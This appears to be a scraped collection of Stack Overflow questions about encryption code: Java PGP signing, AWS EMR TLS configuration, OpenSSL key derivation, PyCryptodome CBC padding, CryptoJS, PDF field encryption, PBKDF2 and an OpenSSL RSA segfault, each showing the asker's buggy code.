        new PGPCompressedDataGenerator(compressionAlgorithm);
    PGPEncryptedDataGenerator pgpEncryptedDataGenerator = new PGPEncryptedDataGenerator(
        // This bit here configures the encrypted data generator
        new JcePGPDataEncryptorBuilder(symmetricKeyAlgorithm)
            .setWithIntegrityPacket(withIntegrityCheck)
            .setSecureRandom(new SecureRandom())
            .setProvider(BouncyCastleProvider.PROVIDER_NAME)
    );
    // Adding public key
    pgpEncryptedDataGenerator.addMethod(new JcePublicKeyKeyEncryptionMethodGenerator(CommonUtils.getPublicKey(publicKeyIn)));
    if (armor) {
      encryptOut = new ArmoredOutputStream(encryptOut);
    }
    OutputStream cipherOutStream = pgpEncryptedDataGenerator.open(encryptOut, new byte[bufferSize]);

    InputStream keyInputStream = Files.newInputStream(new File(&quot;path to private key&quot;).toPath());
    PGPSecretKey secretKey = CommonUtils.findSecretKey(keyInputStream);
    PBESecretKeyDecryptor keyDecryptor = new JcePBESecretKeyDecryptorBuilder()
        .setProvider(BouncyCastleProvider.PROVIDER_NAME).build(signingPrivateKeyPassword.toCharArray());
    PGPPrivateKey privateKey = secretKey.extractPrivateKey(keyDecryptor);

    int algorithm = secretKey.getPublicKey().getAlgorithm();
    PGPSignatureGenerator sigGen = new PGPSignatureGenerator(
        new JcaPGPContentSignerBuilder(algorithm, PGPUtil.SHA512).setProvider(BouncyCastleProvider.PROVIDER_NAME));
    sigGen.init(PGPSignature.BINARY_DOCUMENT, privateKey);
    Iterator it = secretKey.getPublicKey().getUserIDs();
    if (it.hasNext()) {
      PGPSignatureSubpacketGenerator ssg = new PGPSignatureSubpacketGenerator();
      ssg.setSignerUserID(false, (String) it.next());
      sigGen.setHashedSubpackets(ssg.generate());
    }
    /* Output the standard header */
    sigGen.generateOnePassVersion(false).encode(cipherOutStream);
    OutputStream compressedOutStream = compressedDataGenerator.open(cipherOutStream);
    byte[] data = CommonUtils.copyAsLiteralData(compressedOutStream, clearIn, length, bufferSize);
    // Closing all output streams in sequence

    /* Calculate signature and output it */
    sigGen.update(data);
    sigGen.generate().encode(compressedOutStream);

    compressedDataGenerator.close();
    cipherOutStream.close();
    encryptOut.close();
  }

  public byte[] encrypt(byte[] clearData, InputStream pubicKeyIn) throws PGPException, IOException {
    ByteArrayInputStream inputStream = new ByteArrayInputStream(clearData);
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
    encrypt(outputStream, inputStream, clearData.length, pubicKeyIn);
    return outputStream.toByteArray();
  }
</code></pre>
<pre><code>  static PGPPublicKey getPublicKey(InputStream keyInputStream) throws IOException, PGPException {
    PGPPublicKeyRingCollection pgpPublicKeyRings = new PGPPublicKeyRingCollection(
        PGPUtil.getDecoderStream(keyInputStream), new JcaKeyFingerprintCalculator());
    Iterator&lt;PGPPublicKeyRing&gt; keyRingIterator = pgpPublicKeyRings.getKeyRings();
    while (keyRingIterator.hasNext()) {
      PGPPublicKeyRing pgpPublicKeyRing = keyRingIterator.next();
      Optional&lt;PGPPublicKey&gt; pgpPublicKey = extractPGPKeyFromRing(pgpPublicKeyRing);
      if (pgpPublicKey.isPresent()) {
        return pgpPublicKey.get();
      }
    }
    throw new PGPException(&quot;Invalid public key&quot;);
  }

  private static Optional&lt;PGPPublicKey&gt; extractPGPKeyFromRing(PGPPublicKeyRing pgpPublicKeyRing) {
    for (PGPPublicKey publicKey : pgpPublicKeyRing) {
      if (publicKey.isEncryptionKey()) {
        return Optional.of(publicKey);
      }
    }
    return Optional.empty();
  }

  public static PGPSecretKey findSecretKey(InputStream in) throws IOException, PGPException {
    in = PGPUtil.getDecoderStream(in);
    PGPSecretKeyRingCollection pgpSec = new PGPSecretKeyRingCollection(PGPUtil.getDecoderStream(in),
        new JcaKeyFingerprintCalculator());
    Iterator&lt;PGPSecretKeyRing&gt; keyRingIterator = pgpSec.getKeyRings();
    while (keyRingIterator.hasNext()) {
      PGPSecretKeyRing pgpSecretKeyRing = keyRingIterator.next();
      Optional&lt;PGPSecretKey&gt; pgpSecretKey = extractPGPSecretKeyFromRing(pgpSecretKeyRing);
      if (pgpSecretKey.isPresent()) {
        return pgpSecretKey.get();
      }
    }
    throw new PGPException(&quot;Invalid Secret key&quot;);
  }

  private static Optional&lt;PGPSecretKey&gt; extractPGPSecretKeyFromRing(PGPSecretKeyRing pgpSecretKeyRing) {
    for (PGPSecretKey secretKey : pgpSecretKeyRing) {
      if (secretKey.isSigningKey()) {
        return Optional.of(secretKey);
      }
    }
    return Optional.empty();
  }
</code></pre>
<p><strong>Calling the program with below code</strong></p>
<pre><code>BCPGPUtils pgpEncryptionUtil = BCPGPUtils.builder()
            .armor(true)
            .compressionAlgorithm(CompressionAlgorithmTags.ZIP)
            .symmetricKeyAlgorithm(SymmetricKeyAlgorithmTags.AES_256)
            .withIntegrityCheck(true)
            .build();

        File initialFile = new File(&quot;public_key.txt&quot;);
        InputStream targetStream = new FileInputStream(initialFile);

        String str = &quot;test string&quot;;
        byte[] output = pgpEncryptionUtil.encrypt(str.getBytes(), targetStream);

        File file = new File(&quot;encrypted_file.txt&quot;);
        OutputStream os = new FileOutputStream(file);

        // Starting writing the bytes in it
        os.write(output);
        os.close();
</code></pre>
"
"<p>I am creating EMR cluster 6.9.0 with Spark application via Terraform. If I disable In-Transit encryption, then my cluster is working fine and jobs are running successfully. Now, when I enable this encryption and provide .pem files in S3 location and provide the s3 path in the terraform configuration, my EMR cluster creation fails.</p>
<p>Terraform configuration:</p>
<pre><code>{
  &quot;EncryptionConfiguration&quot;: {
        &quot;EnableInTransitEncryption&quot;: true,
        &quot;EnableAtRestEncryption&quot;: true,
        &quot;InTransitEncryptionConfiguration&quot;: {
            &quot;TLSCertificateConfiguration&quot;: {
                &quot;CertificateProviderType&quot;: &quot;PEM&quot;,
                &quot;S3Object&quot;: &quot;arn:aws:s3:::sample-mybucket/certs/MyCerts.zip&quot;
            }
        },
       &quot;AtRestEncryptionConfiguration&quot;: {
            &quot;LocalDiskEncryptionConfiguration&quot;: {
                &quot;EnableEbsEncryption&quot;: true,
                &quot;EncryptionKeyProviderType&quot;: &quot;AwsKms&quot;,
                &quot;AwsKmsKey&quot;: &quot;arn:aws:kms:us-east-1:dummy:key/12345678-1234-1234-1234-123456789012&quot;
            }
       }
    }
}
</code></pre>
<p>It throws the below error.</p>
<pre><code>On the master instance (i-123456789), Invalid S3Provider: Failed to read the private key from /tmp/emr-encryption/privateKey.pem
</code></pre>
<p>I am not getting much information about the error. On the IAM role which run the terraform job as well as S3 bucket has permissions for each other.</p>
<p>IAM role permissions:</p>
<pre><code>{
  &quot;Sid&quot;: &quot;S3AllowReads&quot;,
  &quot;Effect&quot;: &quot;Allow&quot;,
  &quot;Action&quot;: [
     &quot;s3:Get*&quot;,
     &quot;s3:List*&quot;
  ],
  &quot;Resource&quot;: &quot;arn:aws:s3:::*mybucket*&quot;
}
</code></pre>
<p>I haven't specified this /tmp/emr-encryption path, I am assuming IAM role which is creating EMR cluster would download the file to this location. If the assumption is correct, then please clarify, is this the local path or hdfs path.</p>
<p>My S3 bucket has server-side encryption enabled with the same AWS KMS key which is provided in the LocalDiskEncryptionConfiguration and IAM role which is creating the cluster from Terraform has access to this KMS key.</p>
<p>I can also see in CloudTrail, that there are many errors against the following events</p>
<ol>
<li>GetBucketReplication -&gt; ReplicationConfigurationNotFoundError</li>
<li>GetBucketLifecycle -&gt; NoSuchLifecycleConfiguration</li>
<li>GetBucketCors -&gt; NoSuchCORSConfiguration</li>
<li>GetBucketObjectLockConfiguration -&gt; ObjectLockConfigurationNotFoundError</li>
<li>GetBucketWebsite -&gt; NoSuchWebsiteConfiguration</li>
</ol>
<p>If there is any more information that is required to fix this issue, please let me know. Am I missing some configuration in any of the xml configuration files (core-site, yarn-site etc) or the issue is somewhere else?</p>
<p>}</p>
"
"<p>I have an encrypted file where I know the used password and the salt. The file was encrypted with the following credentials:</p>
<ul>
<li>Cipher: <code>aes-128-cbc</code></li>
<li>Hash: <code>sha1</code></li>
<li>Iter: <code>5</code></li>
<li>Password: <code>8P0puxB5OVUFI6uX</code></li>
<li>Salt: <code>MarkRobs</code> --&gt; hex: <code>4d61726b526f6273</code></li>
</ul>
<p>All the following commands and code was tested on Linux with <em>openssl 3.1</em>.</p>
<p>When I use the command line with:</p>
<pre><code>openssl enc -aes-128-cbc -k &quot;8P0puxB5OVUFI6uX&quot; -S 4d61726b526f6273 -d -p -iter 5 -md sha1 -bufsize 1024 -in file.enc -out prj.xma -nosalt
</code></pre>
<p>I get the following key and iv:</p>
<pre><code>key=5864BC3B9AAD200975546C1B0FF6F4CF
iv =FB14855AC59E4C541C48D78891B14495
</code></pre>
<p>With my small program I get the following key and IV:</p>
<pre><code>Using passw.: 8P0puxB5OVUFI6uX (38 50 30 70 75 78 42 35 4f 56 55 46 49 36 75 58)
Using salt:   MarkRobs (4d 61 72 6b 52 6f 62 73)
Using key:    14 14 1d 8a 68 ba c6 2b 76 5e ff 05 86 b8 e8 55
Using IV:     c0 be c4 96 c9 1b 77 ed 3a 1c 53 f7 18 8f d5 98
</code></pre>
<p>Here is the code I implemented:</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;cstring&gt;

#include &lt;openssl/err.h&gt;
#include &lt;openssl/evp.h&gt;

#include &quot;scramble.h&quot;
#include &quot;utils.h&quot;

using std::string;
using std::ifstream;
using std::ios_base;
using std::ios;
using std::exception;
using std::min;
using std::cout;
using std::cerr;
using std::endl;

#define CHUNK_SIZE          1024
#define OSSL_SUCCESS        1
#define OSSL_ERROR          0
#define AES128_KEY_SIZE     16
#define AES128_SALT_SIZE    8

Scramble::Scramble()
{
    mCtx = EVP_CIPHER_CTX_new();

    if (!mCtx)
        cerr &lt;&lt; &quot;Error getting new context!&quot; &lt;&lt; endl;
}

bool Scramble::aesInit(const string&amp; key, const string&amp; salt, bool encrypt)
{
    if (mAesInitialized)
        return true;

    if (!mCtx)
    {
        cerr &lt;&lt; &quot;No context available! Initialisation failed!&quot; &lt;&lt; endl;
        return false;
    }

    int keySize;
    int count = 5;      // Number iterations

    const EVP_MD *md = EVP_sha1();
    const EVP_CIPHER *pCipher = EVP_aes_128_cbc();

    if (!md)
    {
        cerr &lt;&lt; &quot;Error getting SHA1 hash function!&quot; &lt;&lt; endl;
        return false;
    }

    if (!pCipher)
    {
        cerr &lt;&lt; &quot;Error getting the AES128-CBC cipher algorithm!&quot; &lt;&lt; endl;
        return false;
    }

    memset(mAesSalt, 0, AES128_SALT_SIZE);
    memcpy(mAesSalt, salt.c_str(), min((size_t)AES128_SALT_SIZE, salt.length()));
    // Initialize the key and IV with 0
    memset(mAesKey, 0, AES128_KEY_SIZE);
    memset(mAesIV, 0, AES128_KEY_SIZE);

    keySize = EVP_BytesToKey(pCipher, md, (unsigned char *)salt.c_str(), (unsigned char *)key.c_str(), key.length(), count, mAesKey, mAesIV);

    if (keySize == AES128_KEY_SIZE)
    {
        EVP_CIPHER_CTX_init(mCtx);

        if (encrypt)
        {
            if (EVP_EncryptInit_ex(mCtx, pCipher, nullptr, mAesKey, mAesIV) != OSSL_SUCCESS)
            {
                cerr &lt;&lt; &quot;Error initializing decrypting!&quot; &lt;&lt; endl;
                return false;
            }
        }
        else
        {
            if (EVP_DecryptInit_ex(mCtx, pCipher, nullptr, mAesKey, mAesIV) != OSSL_SUCCESS)
            {
                cerr &lt;&lt; &quot;Error initializing decrypting!&quot; &lt;&lt; endl;
                return false;
            }
        }
    }
    else
    {
        cerr &lt;&lt; &quot;Key size is &quot; &lt;&lt; (keySize * 8) &lt;&lt; &quot; bits - should be 128 bits&quot; &lt;&lt; endl;
        return false;
    }

    mAesInitialized = true;
    return mAesInitialized;
}
</code></pre>
<p>Why is this difference and what must I change to get identical key and IV?</p>
<p>BTW: The original file was encrypted on a Windows by using the library <code>LIBEAY32.DLL</code> and the key and IV is different then on Linux although the same C++ code as shown above was used. This I don't understand. What I'm missing?</p>
"
"<p>I'm trying to create a application that will encrypt and decrypt data based on a key generated from a password that the user used. I'm using Pycryptodome and I get this error:
<code>ValueError: Data must be padded to 16 byte boundary in CBC mode</code></p>
<p>Below is the code</p>
<pre><code>from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class SingleEncryption:

    def __init__(self, password):
        self.password = password
        # self.salt = random data
        self.key = PBKDF2(self.password, self.salt, dkLen=32)

    def saveKey(self):

        if input(f&quot;Would you like to save this key ({self.key}) to a file? Y/N &quot;) == &quot;Y&quot;:
            file_out = open(input(&quot;Where should I save it? &quot;), &quot;wb&quot;)
            file_out.write(self.key)
            file_out.close()
        else:
            print(f&quot;Key not saved, the key is {self.key}&quot;)

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ciphered_data = cipher.encrypt(pad(data, AES.block_size))
        return ciphered_data

    def decrypt(self, cipher_data):
        cipher2 = AES.new(self.key, AES.MODE_CBC,)
        original_data = unpad(cipher2.decrypt(cipher_data), AES.block_size)
        return original_data


if __name__ == &quot;__main__&quot;:
    encrypt = SingleEncryption(input(&quot;Encryption password? &quot;))
    while True:
        q = input(&quot;Encrypt, Decrypt, or Quit? &quot;)
        if q == &quot;Encrypt&quot;:
            print(encrypt.encrypt(input(&quot;What to encrypt? &quot;).encode()))
        elif q == &quot;Decrypt&quot;:
            print(encrypt.decrypt(input(&quot;Encrypted data? &quot;).encode()))
        elif q == &quot;Quit&quot;:
            break
        else:
            print(&quot;Incorrect input, it is case sensitive.&quot;)

</code></pre>
"
"<p>I am trying to store fairly sensitive information to JavaScript session pairs, and I have tried to implement CryptoJS.  My question is I have written function to encrypt and decrypt but I am concerned that the pass phrase is exposed in the JavaScript coding. I have little experience with encryption/decryption techniques, and I was hoping to get some guidance.  The code I have works as far as I can determine.  Here again, am I approaching this problem correctly?</p>
<p>These are my current encrypt and decrypt functions:</p>
<pre><code>function EncryptString(Message){
    var PassPhrase = &quot;secret&quot;;
    // Encrypt the Message using AES
    var EncryptedPassword = CryptoJS.AES.encrypt(Message, PassPhrase);
    return EncryptedPassword;
}

function DecryptString(EncryptedPassword){
    var PassPhrase = &quot;secret&quot;;
    // Decrypt the Message using AES
    var DecryptedPassword = CryptoJS.AES.decrypt(EncryptedPassword, PassPhrase);
    // Convert the DecryptedPassword data to a string
    var DecryptedString = DecryptedPassword.toString(CryptoJS.enc.Utf8);
    return DecryptedString;
}
</code></pre>
"
"<p>I tested this code to test by text fields:</p>
<pre><code>PDFWriter.prototype.encrypt = function (ref, obj, pdfSecurity) {
  let encryptedData;

  const encryptFn = pdfSecurity.getEncryptFn(
    ref.objectNumber,
    ref.generationNumber,
  );

  if (encryptFn) {

    if (obj instanceof PDFStream) {
      let toBeEncrypt = obj.getContents();
      encryptedData = new Uint8Array(encryptFn(toBeEncrypt));
      obj.contents = encryptedData;
    }
    else if (obj.lookup(PDFLib.PDFName.of(&quot;Type&quot;)) == PDFLib.PDFName.of(&quot;Annot&quot;)) {
      let values = [&quot;V&quot;, &quot;T&quot;, &quot;DA&quot;];

      for (var i = 0; i &lt; values.length; i++) {
        let data = obj.lookup(PDFLib.PDFName.of(values[i]));
        if (data &amp;&amp; data.value) {
          encryptedData = encryptFn(new Uint8Array(System.Text.Encoding.ASCII.GetBytes(data.value)));
          data.value = System.Text.Encoding.ASCII.GetString(encryptedData);
        }
      }
    }
  }
}
</code></pre>
<p>I used this exemple:
<a href=""https://i.stack.imgur.com/d9vbM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/d9vbM.png"" alt=""enter image description here"" /></a></p>
<p>I tested by ASCII (I think in PDF Literal Strings support just ASCII) and the encryption finally works(text fields) but not after every try, in every try I got one or many text empty fields:
<a href=""https://i.stack.imgur.com/QTUFA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/QTUFA.png"" alt=""enter image description here"" /></a></p>
<p>Here the code first 4 text fields:
Before encryption:</p>
<pre><code>4 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 26 0 R
&gt;&gt;
/DA (0 0 0 rg /F3 11 Tf)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 453.700012 315.700012 467.899994 ]
/Subtype /Widget
/T (Given Name Text Box)
/TU &lt;FEFF004600690072007300740020006E0061006D0065&gt;
/Type /Annot
/V (Hello)
&gt;&gt;
endobj

5 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 27 0 R
&gt;&gt;
/DA (0 0 0 rg /F3 11 Tf)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 421.200012 315.700012 435.399994 ]
/Subtype /Widget
/T (Family Name Text Box)
/TU &lt;FEFF004C0061007300740020006E0061006D0065&gt;
/Type /Annot
/V (þÿ'D91\(J\))
&gt;&gt;
endobj

6 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 28 0 R
&gt;&gt;
/DA (0 0 0 rg /F3 11 Tf)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 388.299988 315.700012 402.5 ]
/Subtype /Widget
/T (Address 1 Text Box)
/Type /Annot
/V (þÿY'U‰WßŠeM)
&gt;&gt;
endobj

7 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 29 0 R
&gt;&gt;
/DA (0 0 0 rg /F3 11 Tf)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 20
/P 22 0 R
/Rect [ 378.4 388.4 446.9 402.6 ]
/Subtype /Widget
/T (House nr Text Box)
/TU &lt;FEFF0048006F00750073006500200061006E006400200066006C006F006F0072&gt;
/Type /Annot
/V &lt;FEFF&gt;
&gt;&gt;
endobj
</code></pre>
<p>After encryption:</p>
<pre><code>4 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 26 0 R
&gt;&gt;
/DA (BýÂ„¡Öû‹¾B Þ¤„îfbÎ&amp;óp£ÿIp‘ù›Š\þ:ø„{†?-}­B&lt;ª    )
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 453.700012 315.700012 467.899994 ]
/Subtype /Widget
/T (BýÂ„¡Öû‹¾B Þ¤„Ã±“æ®ÖLÄc&amp;žQþÍuòÖÒt.ó-‘Å´ƒ}p)
/TU &lt;FEFF004600690072007300740020006E0061006D0065&gt;
/Type /Annot
/V (BýÂ„¡Öû‹¾B Þ¤„Šª™†÷ß¿`?Õò˜o)
&gt;&gt;
endobj

5 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 27 0 R
&gt;&gt;
/DA (4‘_‚J~ßZñuJ]\îÍø)ô[0¸ßœT;ÌÔjÀÇ\éY»X6ß-M.Ã¼í)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 421.200012 315.700012 435.399994 ]
/Subtype /Widget
/T (4‘_‚J~ßZñuJ]\î&quot;o÷§Àij\Ôˆu!•‡e˜‰Îó)Öçy¥¤ïJFdŠ)
/TU &lt;FEFF004C0061007300740020006E0061006D0065&gt;
/Type /Annot
/V (4‘_‚J~ßZñuJ]\îR|™ARqƒ¡hã³»Uy&lt;÷&lt;@@»&quot;I»a£Ê§0Û)
&gt;&gt;
endobj

6 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 28 0 R
&gt;&gt;
/DA (Q¾Ú©hª¶ÈŒæäêèæ@îx ªùé–Cóï5ÍÏ$°léu*Çì‹!t­&amp;)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 40
/P 22 0 R
/Rect [ 165.699997 388.299988 315.700012 402.5 ]
/Subtype /Widget
/T (Q¾Ú©hª¶ÈŒæäêèæg;«è·k6W¹Q!ä€åÆ°]ŒÎ˜*õö5èÅ›t)
/Type /Annot
/V (Q¾Ú©hª¶ÈŒæäêèæÈÛ«Ê±'  ½R7ì!ñ1)
&gt;&gt;
endobj

7 0 obj
&lt;&lt;
/AP &lt;&lt;
/N 29 0 R
&gt;&gt;
/DA (ó„Fû’6ò\ñ=t&gt;&lt;ÉA¾©ªí˜$•Ã5G ÉFÁþy¸x n‹£§)âÈ×)
/DR &lt;&lt;
/Font 24 0 R
&gt;&gt;
/DV &lt;FEFF&gt;
/F 4
/FT /Tx
/MaxLen 20
/P 22 0 R
/Rect [ 378.4 388.4 446.9 402.6 ]
/Subtype /Widget
/T (ó„Fû’6ò\ñ=t&gt;&lt;3xN-ñ&gt;dVù¬H©u`‚7‘ÍžDÆ—í J2g)
/TU &lt;FEFF0048006F00750073006500200061006E006400200066006C006F006F0072&gt;
/Type /Annot
/V &lt;ó„Fû’6ò\ñ=t&gt;&lt;žqæ;FË¶¶.­öLK&gt;
&gt;&gt;
endobj
</code></pre>
<p>What i want to know:</p>
<ol>
<li>Why the fields works just when I use ASCII? is there another way to use UTF-8 in PDF?</li>
<li>What kind of PDF strings should I encryptin a PDF instead of just some (/V, /T, /DA) in text fields.</li>
</ol>
"
"<p>I have a java code that does encryption decryption , but however there is some issue in getting derivedKEK.</p>
<p>In java it is done as</p>
<pre><code>derivedKEK = PBKDF2(ENC_KEY, salt, dkLen=32, count=1000, prf=lambda p, s: HMAC.new(p, s, SHA512).digest())
</code></pre>
<p>The value I get is of length 32 and the data format is</p>
<pre><code>b'K27\xd7\xfc\xbf\xd0d\xec\x8f\xe4\\\x02\x95:0zn\xaf\x8c\xca\xf9\xf8:^(\xf4)\x9b\xd2p\xb8'
</code></pre>
<p>When the original java code is used</p>
<pre><code>    import javax.crypto.Cipher;
    import javax.crypto.KeyGenerator;
    import javax.crypto.SecretKey;
    import javax.crypto.SecretKeyFactory;
    import javax.crypto.spec.GCMParameterSpec;
    import javax.crypto.spec.PBEKeySpec;

    PBEKeySpec pbeKeySpec = new PBEKeySpec(ENC_KEY.toCharArray(), salt, 1000, 256);

    // derive a Key-Encrypting Key (KEK) based on password and other PBEKeySpec attributes
    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA512&quot;);
    SecretKey derivedKEK = keyFactory.generateSecret(pbeKeySpec);
</code></pre>
<p>When i sysout the derivedKEK.getEncoded, i get something in this format</p>
<pre><code>'[B@5123a213'
</code></pre>
<p>as a byte object. Here also length is same 32 bytes. How to adjust the python code to get the same format of derived KEK as java</p>
"
"<p>I'm playing around with openssl 3 (in C++), and I'm trying to write a simple program that reads some bytes, creates on the fly RSA secret/public keys, public encrypts, and decrypts.</p>
<p>I'm stuck at <code>EVP_PKEY_encrypt_init</code>. At that call I get a segmentation fault. If I run the code trough gdb the <code>main</code> returns 5 (still fails, and I'm not sure why).</p>
<p>I'm finding difficult to understand how to actually do the whole application, and I'm mainly basing my exploration on OpenSSL Man3 files. The code is more or less an extrapolation of what I understood of the manual. I'm sure I'm doing something wrong, but I have no idea what. Can you help me?</p>
<p>This is the code, should be MVCE:</p>
<pre><code>#define OPENSSL_NO_DEPRECATED
#include &lt;iostream&gt;
#include &lt;cstring&gt;
#include &lt;cstdio&gt;

#include &lt;openssl/evp.h&gt;
#include &lt;openssl/rsa.h&gt;
#include &lt;openssl/err.h&gt;

constexpr int KEY_BITS = 4096;

void cleanup(EVP_PKEY_CTX * ctx, EVP_PKEY * pkey, unsigned char * encrypted, unsigned char * decrypted) {
    ERR_print_errors_fp(stderr);
    if (ctx) { EVP_PKEY_CTX_free(ctx); }
    if (pkey) { EVP_PKEY_free(pkey); }
    if (encrypted) { OPENSSL_free(encrypted); }
    if (decrypted) { OPENSSL_free(decrypted); }
}


int main(int argc, const char ** argv) {
    EVP_PKEY_CTX * ctx = NULL;
    EVP_PKEY * pkey = NULL;

    if (argc != 2) {
        return 101;
    }

    std::cout &lt;&lt; &quot;MESSAGE: &quot; &lt;&lt; argv[1]  &lt;&lt; std::endl;

    const size_t inlen = strlen(argv[1]);
    size_t outlen = 0;
    size_t doutlen = 0;

    unsigned char * encrypted = NULL;
    unsigned char * decrypted = NULL;

    // Create context
    ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (!ctx) { 
        cleanup(ctx, pkey, encrypted, decrypted);
        return 1;
    }
    // Init key generator
    if (EVP_PKEY_keygen_init(ctx) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 2;
    }

    // Configure key generation
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, KEY_BITS) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 3;
    }

    // Create keys
    if (EVP_PKEY_keygen(ctx, &amp;pkey) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 4;
    }
    // std::cout &lt;&lt; &quot;PRIVATE KEY:&quot; &lt;&lt; std::endl;
    // EVP_PKEY_print_private_fp(stdout, pkey, 0, NULL);
    // std::cout &lt;&lt; &quot;PUBLIC KEY:&quot; &lt;&lt; std::endl;
    // EVP_PKEY_print_public_fp(stdout, pkey, 0, NULL);

    // Init encryption context. 
    if (EVP_PKEY_encrypt_init(ctx) &lt;= 0) { // &lt;-SEGFAULT LINE
       cleanup(ctx, pkey, encrypted, decrypted);
       return 5;
    }

    // Defines padding
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 6;
    }

    // Evaluating size for encrypted buffer and encrypting
    if (EVP_PKEY_encrypt(ctx, NULL, &amp;outlen, (const unsigned char *)argv[1], inlen) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 7;
    }

    encrypted = (unsigned char *)OPENSSL_malloc(outlen);
    if (!encrypted) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 8;
    }

    if (EVP_PKEY_encrypt(ctx, encrypted, &amp;outlen, (const unsigned char *)argv[1], inlen) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 9;
    }

    std::cout &lt;&lt; &quot;ENCRYPTED: &quot; &lt;&lt; (char *)encrypted &lt;&lt; std::endl;

    // Evaluating decryptingsize, allocating buffer and decrypting
    if (EVP_PKEY_decrypt(ctx, NULL, &amp;doutlen, encrypted, outlen) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 17;
    }

    decrypted = (unsigned char *)OPENSSL_malloc(doutlen);
    if (!decrypted) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 18;
    }

    if (EVP_PKEY_decrypt(ctx, decrypted, &amp;doutlen, encrypted, outlen) &lt;= 0) {
        cleanup(ctx, pkey, encrypted, decrypted);
        return 19;
    }

    std::cout &lt;&lt; &quot;DECRYPTED: &quot; &lt;&lt; (char *)decrypted &lt;&lt; std::endl;
    
    cleanup(ctx, pkey, encrypted, decrypted);
    return 0;
}
</code></pre>
<p>I'm compiling from command line with:</p>
<pre><code>g++ -g -Wextra -Werror test.cc $(pkg-config --cflags openssl) $(pkg-config --libs openssl) -o test; ./test sndlkwndl; echo $?
</code></pre>
<p>And this is my OpenSSL version</p>
<pre><code>OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)
built on: Wed Jan 31 18:43:23 2024 UTC
platform: debian-amd64
options:  bn(64,64)
compiler: gcc -fPIC -pthread -m64 -Wa,--noexecstack -Wall -Wa,--noexecstack -g -O2 -ffile-prefix-map=/build/openssl-l59e1T/openssl-3.0.2=. -flto=auto -ffat-lto-objects -flto=auto -ffat-lto-objects -fstack-protector-strong -Wformat -Werror=format-security -DOPENSSL_TLS_SECURITY_LEVEL=2 -DOPENSSL_USE_NODELETE -DL_ENDIAN -DOPENSSL_PIC -DOPENSSL_BUILDING_OPENSSL -DNDEBUG -Wdate-time -D_FORTIFY_SOURCE=2
OPENSSLDIR: &quot;/usr/lib/ssl&quot;
ENGINESDIR: &quot;/usr/lib/x86_64-linux-gnu/engines-3&quot;
MODULESDIR: &quot;/usr/lib/x86_64-linux-gnu/ossl-modules&quot;
Seeding source: os-specific
CPUINFO: OPENSSL_ia32cap=0x7ffaf3bfffebffff:0x40000000029c6fbf
</code></pre>
<p>(Installed from Ubuntu 22.04LTS repo, <code>libssl-dev</code>)</p>
<p>Main References:</p>
<ul>
<li><a href=""https://www.openssl.org/docs/man3.0/man3/EVP_PKEY_CTX_new.html"" rel=""nofollow noreferrer"">https://www.openssl.org/docs/man3.0/man3/EVP_PKEY_CTX_new.html</a></li>
<li><a href=""https://www.openssl.org/docs/man1.1.1/man3/EVP_PKEY_decrypt.html"" rel=""nofollow noreferrer"">https://www.openssl.org/docs/man1.1.1/man3/EVP_PKEY_decrypt.html</a></li>
<li><a href=""https://www.openssl.org/docs/man1.1.1/man3/EVP_PKEY_encrypt.html"" rel=""nofollow noreferrer"">https://www.openssl.org/docs/man1.1.1/man3/EVP_PKEY_encrypt.html</a></li>
</ul>
<p><strong>Side note</strong>: while writing the question I noticed that I'm missing <code>EPV_PKEY_decrypt_init</code> somewhere... But if I can encrypt I'm confident I can understand the remaining part (the fun of exploring).</p>
<h2>Update</h2>
